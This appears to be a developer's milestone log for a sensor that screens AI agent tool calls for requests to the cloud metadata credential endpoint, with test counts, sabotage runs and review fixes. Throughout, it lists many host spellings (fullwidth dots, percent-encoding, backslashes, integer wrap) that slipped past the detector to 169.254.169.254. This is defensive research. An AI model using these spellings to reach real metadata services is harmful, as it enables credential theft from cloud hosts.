  monitor A-flow-R   base=e30d17b1bbbc off=e30d17b1bbbc record=e30d17b1bbbc enforce=e30d17b1bbbc  IDENTICAL
  monitor A-steps    base=8cc17aa1d456 off=8cc17aa1d456 record=8cc17aa1d456 enforce=8cc17aa1d456  IDENTICAL
  monitor P-fault    base=f5a1cdb40a4f off=f5a1cdb40a4f record=f5a1cdb40a4f enforce=f5a1cdb40a4f  IDENTICAL
  monitor P-flow-I   base=dfc965d823fd off=dfc965d823fd record=dfc965d823fd enforce=dfc965d823fd  IDENTICAL
  monitor P-flow-R   base=f7a15b56474d off=f7a15b56474d record=f7a15b56474d enforce=f7a15b56474d  IDENTICAL
  monitor P-input    base=51e3814f8b8d off=51e3814f8b8d record=51e3814f8b8d enforce=51e3814f8b8d  IDENTICAL
  monitor P-seam     base=b48742e05acc off=b48742e05acc record=b48742e05acc enforce=b48742e05acc  IDENTICAL
cross-commit: all identical
  exit 0
--- construction checks from the a4df0e6 wheel:
  enforec_rejected: value_origin mode: expected one of ['off', 'record', 'enforce'], got 'enforec'
  warnings: {'default': 0, 'enforce': 1, 'enforce+designation': 1, 'off': 0, 'record': 0}
```

`80f31ff0…` (P-input, block) is the oracle digest `docs/enterprise-seams-design.md`
recorded for earlier seams.

---

## The owner's open M0 question: what reaches the verdict when `authority_of` is None

**Answer: None never reaches the verdict.** `authority_of` is not on the
verdict path. In `xaidr/`, its only uses are its definition and the export in
`value_origin/__init__.py`. The verdict path is:

- `evaluate_call` (`_evaluate.py`);
- then `extract_destinations` (`_extract.py`);
- then `classify_value(leaf, arg_mode=True)` (`_authority.py`).

For a two-host value, `classify_value` returns a **list**, and
`extract_destinations` emits one `Finding` per host (`out.extend(...)`). Each
is looked up, and the weakest wire decides. Executed at M3:

```
authority_of(url)            = None
extract_destinations         = [('dns:corp.example', None), ('dns:evil.test', None)]
evaluate_call.wire           = untrusted_source | findings: [('dns:corp.example', 'principal'), ('dns:evil.test', 'untrusted_source')]
should_block(ENFORCE)        = True
key_authority(url) [designation key arg] = None -> no authority basis; only an n-gram could authorize the key
```

Two other sites have the same "one answer or None" shape. Both fail closed:

- **The recording side.** `result_authorities` and `prose_candidates` extend
  with every host of the list. Both readings are recorded.
- **`key_authority`, the designation's key argument (`_ledger._KeyPlan`).**
  None means the key has no authority basis. The read is then trusted only if
  an n-gram authorizes the key. A two-host URL is not a valid n-gram (V-8d
  refuses it), so the read records `untrusted_source`.

So None means "no single authority". It never means "no destination".

---

## M2 — the url_parse differential, tests only. **Green.**

**Commit `f95f5df`.** The tests are at the bottom of
`tests/test_differential_oracles.py`. They live in M0's multi-oracle module,
not in `test_differential_parsers.py` as §2.4 said. They need the dev-extra
oracles and share M0's refuse-not-skip fixture. The core half of §2.4 was
delivered at M0 as `test_core_reads_every_host_any_consumer_reads`.

**What it compares.**
- The code under test is `parse_url(url).address`.
- It is compared with the address class each of four consumers reaches:
  urllib.parse, httpx, urllib3 and ada (WHATWG).
- Each consumer's host goes to the platform resolver the way a Python client
  hands it over: `socket.getaddrinfo(str, AI_NUMERICHOST)`, which runs Python's
  IDNA codec and then libc's numeric parse.
- Superset rule: `address` must be at least as severe as the most severe class
  any consumer reaches.
- The grid is 24,960 spellings: url_diff.py's axes widened with M0's split
  prefixes, the mirror tail and `_urls()`'s userinfo forms.

### Red: every strict xfail at M2, by `--runxfail` (macOS 3.12.2)

```
[special-scheme-without-//] 6304 spellings ... (reached by {'ada-url (WHATWG)': 6304}); 'http:169.254.169.254': url_parse=None ...
[backslash] 2742 ... (reached by {'ada-url (WHATWG)': 2213, 'urllib3': 2002, 'httpx': 252, 'urllib.parse': 252}); 'http://169.254.169.254\\x': url_parse=None
[urlsplit-refusal] 528 ... (reached by {'ada-url (WHATWG)': 516, 'httpx': 360, 'urllib3': 420}); 'http://&a:foo(b]c@169.254.169.254': url_parse=None
[fullwidth] 252 ... 'http://169．254．169．254': url_parse=None, ada-url (WHATWG), httpx, urllib.parse reach link_local
[percent-encoded-host] 210 ... 'http://%31%36%39.254.169.254': url_parse=None, ada-url (WHATWG), urllib3 reach link_local
[empty-hex-part] 252 ... 'http://0x.0x.0': url_parse=None, ada-url (WHATWG), httpx, urllib.parse, urllib3 reach private
1428 spellings where url_parse reports a class no consumer reaches; 'http://١٦٩.٢٥٤.١٦٩.٢٥٤': url_parse=link_local, readings={'urllib.parse': None}
fullwidth dots: httpx reaches 169.254.169.254 for 'http://169．254．169．254/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
percent-encoded: urllib3 reaches 169.254.169.254 for 'http://%31%36%39.254.169.254/' and url_parse reports address=None, so a credential fetch through it is not blocked
3 host spellings the resolver reaches at a more severe class than url_parse reports: [('0x.0x.0', ...0.0.0.0, None), ('0x.1.1.1', ...0.1.1.1, None), ('169．254．169．254', ...169.254.169.254, None)]
2 host spellings where the resolver reaches an address the core never names: [('0x.0x.0', '0.0.0.0', ['dns:0x.0']), ('0x.1.1.1', '0.1.1.1', ['dns:1.1'])]
1 decimal integers above 2**32-1 that the resolver wraps to an address neither url_parse nor the core reads: [('4294967296', '0.0.0.0', None, ['dns:4294967296'])]
12 failed, 8 passed
```

**Found by M2, not in the plan:** `urlsplit-refusal`. When `urlsplit` raises,
url_parse returned None, meaning "not a URL". httpx, urllib3 and WHATWG send
`http://&a:foo(b]c@169.254.169.254/` to the link-local address anyway.

**Counts by class (M2 silent-failure review).** The M2 per-class counts used
first-match order, with backslash before refusal. 176 of the 2,742 backslash
rows are really refusals. From M3 on, refusal is checked first.

### Green at M2: four interpreters

```
== macOS 3.12.2      8 passed, 12 xfailed
== linux 3.10.21    10 passed, 10 xfailed
== linux 3.11.16    10 passed, 10 xfailed
== linux 3.12.14    10 passed, 10 xfailed      (the 2 darwin-conditional xfails pass on Linux)
```

**CI on `f95f5df`: green.** PR #34, GitHub Actions run `37173748403`, "CI completed success"; DCO run `37173748321` passed.

### Sabotage at M2: the reading set cut to `urllib.parse` alone

```
macOS:  [XPASS(strict)] special-scheme-without-//, urlsplit-refusal, percent-encoded-host
        XFAIL (still)   backslash, fullwidth, empty-hex-part      4 failed (incl. non-vacuity)
linux:  XPASS(strict) also empty-hex-part (glibc refuses 0x.)     5 failed
restored byte-identical (sha 54a1fdf4...), 8 passed, 12 xfailed
```

**The plan's sabotage claim was wrong, and it is retracted in place in
ARCHITECTURE.md §5 M2.** The fullwidth class stays a genuine xfail with
`urllib.parse` alone: `getaddrinfo` runs Python's IDNA codec, which maps
U+FF0E. The M2 milestone reviewer cut `_oracles()` itself rather than the
comparison loop. With that cut, the two named F3 tests fail with a
`KeyError` instead of flipping, so that sabotage proves nothing through them.

### Two darwin-only resolver classes beyond Q22, held for the owner

1. **Integer wrap.** The macOS resolver reads a number above 2**32-1 modulo
   2**32: `4294967296` → `0.0.0.0`, and WPT's `0x100000000` → `0.0.0.0`.
   glibc and WHATWG refuse both. It is pinned as a strict xfail on darwin
   (`test_bsd_libc_integer_wrap_is_an_unruled_platform_class`, decimal form).
   It is neither exempted nor read.
2. **A leading zero in an embedded IPv4** (WPT
   `https://[0:1:2:3:4:5:192.0.02.1]/`). urllib3 hands the host to the macOS
   resolver, which reads `0:1:2:3:4:5:c000:201`. It is a public class, so it
   moves no block decision. Found by the M3 WPT run. Not pinned yet.

### Fresh-context reviews of M2

- **silent-failure-hunter.**
  1. First-match ordering misattributed 176 refusals to the backslash class.
     Fixed at M3.
  2. `_resolve`'s `ValueError` branch is likely dead.
  3. The exemption predicates are exact.
  4. The floors are real.
  5. Refuse-not-skip holds.
- **milestone-reviewer.** It confirmed every count and both platform halves.
  It found the following. Each is fixed at M3 unless the line says otherwise.
  1. Rule 2 (named over-read classes) was a blanket xfail.
  2. **"urllib.request passes the raw netloc on" is false.** It percent-decodes
     the host and reaches `%31%36%39.254.169.254`. Retracted in place
     everywhere it was written, including a docstring in `_authority.py`.
     urllib.request is not among the four oracles; this is named, not fixed.
  3. **Q22's exemption hides a link-local reach on darwin.**
     `000169.254.000169.254` resolves to 169.254.169.254 there, ~~and url_parse
     and the core read octal `121.254.121.254`~~ *[retracted, M3 review,
     measured: url_parse reads NO address and the core `dns:000169.254`, since
     `000169` is not octal; `169.000254.169.000254` reads public
     `169.172.169.172` in both. The same false premise is in commit `6463337`'s
     message, which is not rewritten (no force-push)]*. Q22 was ruled on the premise
     "the decimal reading lands in 240/4", which is false for these forms.
     Pinned as a darwin strict xfail
     (`test_q22_exemption_hides_no_link_local_reach`) **for a re-ruling**.
  4. ARCHITECTURE.md called urlsplit-refusal "WHATWG-only". Corrected.
  5. No M2 evidence was in the commit. This section is it.
  6. **Q19 (vendoring WPT) was dropped without saying so.** It is still not
     vendored. M3 ran WPT from the pinned copy instead (sha256 `81e85fd3…f652`,
     commit `c48d5874`). Vendoring is open.
  7. The departures from §2.4 were not stated. They are now annotated in
     §2.4.

---

## M3 — url_parse moved onto the core's host canonicalisation. **Green on four interpreters.**

**Commits.**
- `dfb4334`: core, **SEMANTIC, a new paid pin**. `coerce_ip` reads an empty
  hex part as 0 and digit-checks integer parts.
- `e2e8bb9`: the url_parse move.
- `6463337`: the outside driver, the named over-read classes, the Q22
  consequence pin and the retractions. It includes a behaviour-neutral
  DOCSTRING change in `_authority.py`, which still changes the pin bytes.

**How the move is built.** Q5 (a) "a shared helper" needed no new helper: url_parse calls the core's
existing `classify_value` (every reading: WHATWG, 3.12.2's RFC split, the
refusal reading, R4) and `_host_authority` (the whole host pipeline) directly,
so the pipeline order lives only in the vendored unit. `address` = the most
severe class across those readings plus this interpreter's `urlsplit` host
(which also covers `file:`). `UrlShape.host` keeps urlsplit's spelling.

### `https://0x.0x.0/`: fixed, not left as an xfail (`dfb4334`)

Red against the unfixed core:

```
E  AssertionError: assert Authority(sch... value='0x.0') == Authority(sch...lue='0.0.0.0')
E  AssertionError: M3-empty-hex-part (...): ...
E  AssertionError: 2 host spellings where the resolver reaches an address the core never names: [('0x.0x.0', '0.0.0.0', ['dns:0x.0']), ('0x.1.1.1', '0.1.1.1', ['dns:1.1'])]
3 failed
```

Pre-fix against fixed core (`git show` of the pre-fix file, run side by side):

```
https://0x.0x.0/         pre-fix=dns:0x.0       fixed=ip:0.0.0.0
http://0x.1.1.1/         pre-fix=dns:1.1        fixed=ip:0.1.1.1
http://0x/               pre-fix=dns:0x         fixed=ip:0.0.0.0
http://0x_1.1.1.1/       pre-fix=ip:1.1.1.1     fixed=dns:1.1     (int() took the `_`; no resolver does)
http://0_7.1.1.1/        pre-fix=ip:7.1.1.1     fixed=dns:1.1
http://0x1f.1/           pre-fix=ip:31.0.0.1    fixed=ip:31.0.0.1
```

**`expected.jsonl`.** sha256 `d8bd14cd…ffbd53` → `dc9329b6…7109b`. That is one
added row, `M3-empty-hex-part`, regenerated by `convert.py --rev 01450c7…`.
SEMANTIC, so paid's re-vendor bumps `EVALUATOR_GENERATION`.

**Green for `dfb4334`.**

```
== macOS 3.12.2      503 passed, 22 xfailed
== linux 3.10/3.11/3.12   504 passed, 21 xfailed each
```

### url_parse move (`e2e8bb9`): red first, then green

The M2 strict xfails were un-xfailed first, and the run went red against the
unmoved url_parse. Ten failures, the same classes and counts as M2's
`--runxfail` above:

```
10 failed, 9 passed, 1 xfailed
```

Green on the M3 tree (`6463337`); the final numbers are just below. The suites are the url_parse and core
differentials, `test_url_classes`, `test_differential_parsers`, conformance,
C-11, the 456-row oracle and `tests/outside`:

```
== macOS 3.12.2      587 passed, 19 xfailed
== linux 3.10.21     589 passed, 17 xfailed
== linux 3.11.16     589 passed, 17 xfailed
== linux 3.12.14     589 passed, 17 xfailed
```

**Final tree** (after `ea7fa59` and the milestone-review fixes):

```
== macOS 3.12.2      604 passed, 20 xfailed
== linux 3.10.21     606 passed, 18 xfailed
== linux 3.11.16     606 passed, 18 xfailed
== linux 3.12.14     606 passed, 18 xfailed
```

**Honest reds on the way, each fixed before the green above.**
1. Over-reads of Q22's class from the other side: 534 on darwin. url_parse
   reads octal link-local, and the macOS resolver reads decimal.
2. Over-reads from the core's one host pipeline: 356. The pipeline
   percent-decodes, strips the root dot and parses an empty hex part, on hosts
   that only RFC readings split out.
3. 296 over-reads of M0's `urlsplit-bracket-validation` class, on Linux only.
4. 24 darwin over-reads that the bracket predicate grabbed. Their real cause
   was Q22. The mechanism classes are now checked first.
5. 134 Linux over-reads behind a `\@`, which glibc refuses: `0x.0x.0`.

Each class is named with a reason and pinned. The Q22 and bracket classes
are pinned both ways, by platform or interpreter. The pipeline class must
absorb something, or it is red.

### F3: each spelling named with the consumer that reaches it

| spelling | before M3 | after | consumer that reaches 169.254.169.254 |
|---|---|---|---|
| `http://169．254．169．254/latest` | None | link_local | httpx (also urllib.parse+resolver, ada) |
| `http://%31%36%39.254.169.254/` | None | link_local | urllib3 (also ada, and urllib.request per the M2 review) |
| `http://１６９.２５４.１６９.２５４/latest` | link_local | link_local (pinned) | ada; urllib.parse+resolver |

**F3's "live bypass" was half true, and that is measured.** On `http://`, the
`SHELL_cloud_metadata_credentials` regex accident already flagged the
fullwidth-dots spelling at 0.90 before M3. The live bypass was the
`https://` form, which went from `allowed 0.0000` to `flagged 0.9000`. The
percent form was a live bypass on both schemes.

### Sabotage, both directions

```
=== SABOTAGE M3: url_parse reverted to its pre-M3 bytes (_coerce_ip)
E  AssertionError: fullwidth dots: httpx reaches 169.254.169.254 for 'http://169．254．169．254/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
E  AssertionError: percent-encoded: urllib3 reaches 169.254.169.254 for 'http://%31%36%39.254.169.254/' and url_parse reports address=None, so a credential fetch through it is not blocked
10 failed, 11 passed, 1 xfailed
=== same sabotage: tests/test_url_classes.py (must stay green)
98 passed
=== SABOTAGE M3-b: the naive move, the core's coerce_ip ALONE on the urlsplit host
E  AssertionError: fullwidth digits: ada-url (WHATWG) reaches 169.254.169.254 for 'http://１６９.２５４.１６９.２５４/latest' and url_parse reports address=None, so a credential fetch through it is not blocked
8 failed, 2 passed
=== RESTORED (sha 15c063a0..., byte-identical)
```

### Outside the process: built wheels, fresh venvs, `python -I`

**The Q4 delta list.** `tests/outside/drivers/url_parse_deltas.py` sends 32
spellings through `scan_tool_call("http_get", ...)` of the installed sensor.
The base wheel is `f95f5df`; HEAD is the M3 tree. `--compare` exits 0 only if
the moved set equals the declared set.

```
  MOVED  'http://%31%36%39.254.169.254/latest'       base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169．254．169．254/latest'          base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169.254.169.254\\latest'           base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://169.254.169.254\\@corp.example/'   base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https:169.254.169.254/latest'              base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://&a:foo(b]c@169.254.169.254/latest' base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'http://١٦٩.٢٥٤.١٦٩.٢٥٤/latest'             base=flagged 0.9000 credential_access net.metadata_link_local  head=allowed 0.0000 - -
  MOVED  (6 http:// spellings: same action, flagged 0.9000, rules gain net.metadata_link_local)
  same   19 controls, incl. fullwidth DIGITS, 0x.0x.0 (private: classify-only), 1.2.3.256, metadata.google.internal
moved=13 declared=13 undeclared_moves=[] declared_but_unmoved=[]
```

That first list was **incomplete** (M3 milestone review, above). On the final
tree, against the same base wheel:

```
head: OFF, RECORD and ENFORCE identical on every spelling: True
  MOVED  'ws://169．254．169．254/'              base=allowed 0.0000 - -  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'https://169。254。169。254/'           base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'https://169.254.169.254%2e/'        base=allowed 0.0000 - -  head=flagged 0.9000 ...
  MOVED  'gopher://%31%36%39.254.169.254/'    base=flagged 0.8500 execute net.scheme_smuggling  head=flagged 0.9000 credential_access net.metadata_link_local
  MOVED  'http://0x_A9FEA9FE/'                base=flagged 0.9000 credential_access net.metadata_link_local  head=allowed 0.0000 - -
  same   '169.254.169.254./latest'            (control: refused before M3 and again now)
  ... (27 moved in all, 21 controls)
moved=27 declared=27 undeclared_moves=[] declared_but_unmoved=[]
```

The default sensor flags; it does not block. `flagged` at 0.90 is the action
the link-local rule produces in the default enforcement mode.
`tests/outside/test_m3_url_parse_from_the_wheel.py` asserts the HEAD half in
CI's `full` config.

**C-11 across commits** (base `f95f5df` OFF against M3's OFF, RECORD and
ENFORCE, from built wheels): **all 18 pass×mode digests identical**.
They match M1's digests.

```
  block   P-input   base=80f31ff0b5d5 off=80f31ff0b5d5 record=80f31ff0b5d5 enforce=80f31ff0b5d5  IDENTICAL
  ... (18 rows) ...
cross-commit: all identical
```

**Deviation from §3.2 item 3, stated.** The §2.2 grid was NOT appended to
P-flow-R. The C-11 corpora contain none of M3's delta spellings, so no C-11
row moved. The requirement that "at least one listed row must move" is met by
the delta driver (13 = 13), not by C-11. `c11_oracle.py --compare` also
assumes a base wheel that predates `value_origin=`. Against `f95f5df` it
raised `KeyError: 'default/block'`, so the 18 rows above came from a
scratchpad comparison of base OFF against HEAD's three modes.

### Adversarial: WPT urltestdata.json (560 absolute inputs, a corpus M3 was not built on)

```
pre-M3 url_parse, macOS:  7 under-reads (incl. https://0x.0x.0, https://0x.0x.0x.0x reached by ada)
M3 url_parse,     macOS:  5 under-reads, all macOS-resolver readings, none link-local:
                            3 x Q22 decimal (09.2.3.4, 1.2.3.08, 1.2.3.09 -> public)
                            0x100000000 -> 0.0.0.0 (the unruled wrap class, hex form)
                            [0:1:2:3:4:5:192.0.02.1] -> public (a third darwin class)
M3 url_parse,     linux 3.12.14: 0 under-reads, 0 over-reads
```

### Fresh-context reviews of M3

- **silent-failure-hunter, on `6463337`.**
  1. **Medium, fixed in the next commit.** `parse_url`'s blanket `except
     Exception: return None` now wrapped the core's readings. A fault there
     turned a link-local URL into "not a URL", silently. The core calls are
     now isolated. A fault is logged once per process at ERROR, and the
     `urlsplit` reading still classifies the URL. Red first:
     ```
     E  AssertionError: a core fault made a link-local URL read as None: the credential fetch would go unclassified, silently
     ```
     Then green (`121 passed, 3 xfailed`, url_classes + differentials).
  2. The refused branch: no regression.
  3. The `coerce_ip` digit checks change exactly the two stated behaviours.
     The reviewer ran `0X1F`, `00`, `08`, `0x1_f` and whitespace.
  4. Q22's darwin link-local reach is open and pinned; it is not resolved.
  5. No vacuous passes. Its run gave `502 passed, 9 xfailed`.
- **milestone-reviewer, on `6463337`.** It reproduced the 13/13 delta compare,
  the sabotage, the expected.jsonl regeneration byte for byte, and Linux.
  It found the following; each is fixed in the commit after `ea7fa59`.
  1. **The declared list was incomplete.** "Moved equals declared" held only
     over the driver's own spellings. Moving and undeclared were:
     - `ws`, `wss` and `ftp` forms;
     - U+3002 and U+FF61 dots;
     - `https:///`, `https:\\` and `%2e`;
     - the M3a digit-check consequences (`0x_A9FEA9FE`, `0_251…`, both now
       allowed);
     - gopher and file percent hosts, whose rule, score and category change.

     All are declared now. The differential's fullwidth class and its grid now
     include U+3002 and U+FF61.
  2. **A new over-read.** Scheme-less `169.254.169.254./latest` became
     link_local, and both resolvers refuse it. The scheme-less branch refuses
     a root dot again, as it did before M3. It is a driver control, and it does
     not move.
  3. **C-11 was vacuous for M3.** No C-11 corpus row contains a delta spelling.
     The delta driver now also runs every spelling under OFF, RECORD and
     ENFORCE, and `--compare` fails unless all three are identical at HEAD.
     The CI test asserts it too. **Still not done:** §3.2's "append the §2.2 grid
     to P-flow-R" in `c11_oracle.py`, and a delta allowance in its
     `compare()`. The delta driver carries C-11 for the spellings M3 moves.
  4. **False claims, retracted in place.**
     - "raw netloc" was still in the rulings doc, line-wrapped where my grep
       missed it.
     - The Q22 premise "url_parse and the core read octal 121.254.121.254" is
       false. They read no address and `dns:000169.254`. It is corrected in
       the xfail reason and above, and it also stands in commit `6463337`'s
       message, which is not rewritten.
     - "The macOS resolver reads `0x`" is false: it refuses `0x` alone.
     - The PROGRESS evidence was missing at `6463337`. It landed in `ea7fa59`.

### Found, not fixed

- **R4 hostnames.** `http:metadata.google.internal/x` (no `//`): url_parse
  returns None, so the hostname rules never see it, and WHATWG reaches the
  name. `address` comes from the core now. `host` still comes from urlsplit,
  as §2.1 required. It is pinned as a strict xfail,
  `test_r4_a_metadata_hostname_without_slashes_reaches_the_hostname_rules`.
  The WHATWG reach is checked first with `pytest.fail`, so a broken
  precondition cannot pass as the xfail. Its red:
  ```
  E  AssertionError: WHATWG reaches metadata.google.internal for 'http:metadata.google.internal/computeMetadata/v1/'; url_parse gives None
  ```
- **urllib.request** is not one of the oracles (M2 review, item 2).
- **Q19 vendoring** is open (see above).

---

## Q22 re-ruled, and R4 applied to url_parse (before M4), `75f5a2a`

**Q22, re-ruled by the owner on 2026-10-04.** The old premise, that the
decimal reading lands in reserved space, was wrong.
`000169.254.000169.254` reaches 169.254.169.254.

**Measured on macOS before writing the tests.** The resolver differs from
inet_aton and WHATWG in three ways:
1. A leading-zero dotted quad is read as DECIMAL.
2. So is the IPv4 tail of an IPv6 literal.
3. A single number above 2**32-1 wraps modulo 2**32, in decimal, hex and
   octal. For example, `0x1A9FEA9FE` → 169.254.169.254.

**Two facts the ruling did not anticipate**, both applied by its general rule
(STOP item):
- The embedded class is not always public. `[::ffff:169.254.0169.254]`
  resolves to the mapped link-local address, so it is READ.
- Q22's own example, 251.254.251.254, is `is_private` to `ipaddress`.

**Red first:** 14 named failures, including:

```
E  AssertionError: the macOS resolver sends 'http://000169.254.000169.254/latest' to 169.254.169.254 (link_local); the core reads ['dns:000169.254'] and url_parse reports None
E  AssertionError: the macOS resolver sends 'http://0x1A9FEA9FE/latest' to 169.254.169.254 (link_local); the core reads ['dns:0x1a9fea9fe'] and url_parse reports None
E  AssertionError: the macOS resolver sends 'http://[::ffff:169.254.0169.254]/latest' to 169.254.169.254 (link_local); the core reads [] and url_parse reports None
E  AssertionError: WHATWG reaches metadata.google.internal for 'http:metadata.google.internal/computeMetadata/v1/'; url_parse gives None
14 failed, 2 passed
```

**Green:**
- macOS 3.12.2, and Linux 3.10.21, 3.11.16 and 3.12.14: 617 passed, 17
  xfailed each.
- `expected.jsonl` gains the `Q22-rerule-macos-decimal-quad` row. SEMANTIC.

**Sabotage.** Dropping the core's macOS readings and url_parse's R4 host
turns the same 14 red. The pre-existing gates (`test_url_classes` and the M0
core differential) stay green: `105 passed`.

**R4: I ruled the M3 xfail a contradiction, and fixed it.** It is the same
consumer fact as R4 and the same superset obligation; the reasons are in the
rulings doc. The hostname MIRROR shape (`metadata.google.internal\@corp.example`)
is named open.

---

## M4 — tool-call evaluation, RECORD only. **Green. STOP AND REPORT.**

**Build.**
- `scan_tool_call` evaluates `evaluate_call` FIRST: before the gates, the
  breaker and `_resolve_provenance` (V-7a).
- It attaches `ScanResult.value_origin` once, around the whole body, so every
  exit carries it (C-13). This replaces the plan's attach-at-each-exit. ~~A new exit path cannot be
  added without it.~~ *[Retracted, M4 review: a caller that builds a fresh
  result after the wrapper loses the verdict. `autopatch.tool_verdict`
  carries it, and that is now tested.]*
- OFF evaluates nothing.
- `autopatch.tool_verdict`'s fresh `TOOL_BLOCKED` result keeps the verdict.
- Q6, as ruled: the first `no_flow` call per sensor logs ONE warning naming
  `begin_flow()` and `extract_context()`.

**Red first.** The first red run hit a driver bug of mine: an open circuit
gates only in `block` mode. The path precondition caught it, which is what it
is for. After fixing that, the red against the unchanged sensor was:

```
E  AssertionError: [record] the scan_error call never reached its path: allowed scan_error SCAN_FAILED_OPEN   (my marker was wrong; fixed)
E  AssertionError: None                                             (no value_origin: no_flow expected)
E  AssertionError: Q6: three no_flow calls on one sensor logged 0 begin_flow() warnings; the owner's ruling is exactly one
3 failed
```

**Green** on the M4 suites, C-11, the 456-row oracle, `tests/outside`
(including `test_m4_from_the_wheel`), url_classes, conformance and the
differentials:

```
== macOS 3.12.2      593 passed, 13 xfailed
== linux 3.10.21     593 passed, 13 xfailed
== linux 3.11.16     593 passed, 13 xfailed
== linux 3.12.14     593 passed, 13 xfailed
```

The seven test files that inspect logs around tool calls: 150 passed, 79
skipped. The skips are the real-framework tests, which CI's dedicated job
runs.

**Sabotage, each a named red.**

```
=== A: attach skipped on the circuit-open exit
E  AssertionError: C-13: every tool-call exit carries the verdict, and these do not: [record] circuit exit (_emit_circuit_open_verdict): value_origin wire=None, want 'no_flow'; [enforce] circuit exit (_emit_circuit_open_verdict): ...
--- same sabotage, the C-11 gate: 20 passed   (discriminating: C-11's digests cannot see the attach)
=== B: the once-guard dropped
E  AssertionError: Q6: three no_flow calls on one sensor logged 3 begin_flow() warnings; the owner's ruling is exactly one
=== C: the warning dropped
E  AssertionError: Q6: three no_flow calls on one sensor logged 0 begin_flow() warnings; the owner's ruling is exactly one
```

**A sabotage-procedure finding.** The first run after restoring gave
`1 failed`.
- Sabotage C (`if first:` → `if False:`) is the same byte length as the
  original: 220,520 bytes both ways.
- The restore landed within the bytecode's mtime resolution.
- So CPython kept the sabotaged `.pyc`.
- With `__pycache__` cleared: `3 passed`.

A same-length sabotage can therefore leak past its own restore. From now on,
sabotage runs use `PYTHONDONTWRITEBYTECODE=1`.

**From outside the process.** `tests/outside/test_m4_from_the_wheel.py` runs
the same driver from the built wheel in a fresh venv. It checks:
- every exit's marker, then its wire;
- `no_flow`, then `ledger_absent` after `begin_flow()`;
- one Q6 warning.

**C-11 across commits.** Base `75f5a2a` OFF against M4's OFF, RECORD and
ENFORCE, from wheels: **all 18 identical**, P-input block `80f31ff0b5d5`.

**Still strict xfails, as planned:** 4a-I (M6), 4a-R (M7) and 4b (M8).
`no_destination` and `truncated` are unreachable until M5 binds a ledger.

---

## M4 fresh-context reviews, and what changed after them (`9ac4474` → the next commit)

**CI on `9ac4474`: green.** 13 of 13 checks, run `37178759851`, including
the full `pytest` matrix.

**silent-failure-hunter, medium-high.** `replace(result, value_origin=cv)` sat
outside the fail-open body. An extension's `gate` or `transform_verdict` can
return a non-dataclass with a valid `.action`, and the attach then raised into
the host. **Fixed:** the result comes back unmodified, and the fault is logged
once per sensor. Red first:

```
E  TypeError: replace() should be called on dataclass instances
```

**milestone-reviewer.** Every red, every sabotage, the outside run and a
Linux leg reproduced. What it found:
1. The same `replace()` defect, from the `gate` path as well. Fixed above.
2. **The DEFAULT `Sensor` (`value_origin="record"`) now logs the Q6 warning
   on its first unflowed tool call.** That reaches every existing user who
   never calls `begin_flow()`, and nothing said so. It is stated here and in
   the report. The stale "INERT" comment in `sensor.py` is corrected in
   place. README and `docs/api.md` still say nothing about `value_origin`.
   **Not done.**
3. **The autopatch claim had no test.** Now it has one. Red with the line
   removed: `the TOOL_BLOCKED exit lost value_origin: None`. "A new exit path
   cannot be added without it" is retracted in place.
4. **`75f5a2a` moved detection, undeclared** (on OFF wheels):
   `https://000169.254.000169.254/latest`, `https://0x1A9FEA9FE/latest` and
   `https:metadata.google.internal/…` all went `allowed` → `flagged`. They
   are now declared. Base `f95f5df` against this tree gives `moved=30
   declared=30 undeclared_moves=[]`, and OFF, RECORD and ENFORCE are
   identical on every spelling.
5. **The Q22 change over-reads on Linux, and no gate names it.**
   - `010.0.0.1` reaches public `8.0.0.1` on glibc, and url_parse reports
     `private`.
   - None of the Q22 spellings are in either gate's corpus.
   - This is the ruling's intended effect (read on every platform), but §2.3
     rule 2 wants a named class. **Open.**
6. **Integer wraps that land in public space are still exempt.** On macOS,
   `4311810312` resolves to `1.1.1.8`. Under ENFORCE, an untrusted public IP
   in the ledger is reachable through that spelling. The ruling's text says
   "integer wrap is NOT exempt", and its reason is sensitivity. **Held for
   the owner:** read ALL macOS readings in the core, or only sensitive ones?
7. **R4 framing.** "Contradicted a settled ruling" overreached, because §2.1
   limited M3 to `address`. It is qualified in place as a gap closed by
   choice under Q2.
8. **`c11_oracle --compare` crashed** on a base wheel that already has
   `value_origin=`. Fixed: it falls back to the base's OFF digests. Run on
   `75f5a2a` against M4, it says `cross-commit: all identical`.

**Refuted by the reviewer:**
- A re-raise path that loses the verdict: none. Contract errors carry no
  `ScanResult`.
- V-7a: it holds. The docstring's reason ("which can start a flow") was
  wrong and is fixed.

**Final M4 tree.** The files are `tests/test_value_origin_m4.py`,
`tests/outside/test_m4_from_the_wheel.py`,
`tests/outside/test_m3_url_parse_from_the_wheel.py`,
`tests/test_value_origin_c11.py`, `tests/test_differential_oracles.py`,
`tests/value_origin_conformance`, `tests/test_url_classes.py` and
`tests/test_seam_zero_movement.py`:

```
== macOS 3.12.2    574 passed, 13 xfailed
== linux 3.12.14   574 passed, 13 xfailed
```

---

## The owner's three answers after M4, and the standing bytecode rule, `460c541`

1. **The warning is documented.** README.md has one line under "API
   reference": what it means and what `begin_flow()` does. `docs/api.md` has a
   short section.
2. **Every macOS-resolver reading is read, public ones included.** Q22 is
   re-ruled a second time.
   - Red first, 7 named:
     ```
     E  AssertionError: the macOS resolver sends 'http://4311810312/latest' to 1.1.1.8 (public); the core reads ['dns:4311810312'] and url_parse reports None
     E  AssertionError: the macOS resolver sends 'http://[0:1:2:3:4:5:192.0.02.1]/latest' to 0:1:2:3:4:5:c000:201 (public); the core reads [] and url_parse reports None
     7 failed, 14 passed
     ```
   - New conformance row `Q22-rerule-macos-public-wrap`. SEMANTIC.
   - ~~**False-positive cost on the benign corpora: 0.** Across 9 files and
     16,683 string leaves,~~ *[RETRACTED, M5 milestone review: vacuous by
     construction. No benign corpus here contains a host any macOS reading can
     change. The only numeric host in all nine files is `169.254.169.254`. The
     16,683 also counted dict keys and `benign_longform/manifest.json`
     metadata. Honest statement: the widening touches only hosts with a
     leading-zero numeric part, a single number above 2**32-1, or a
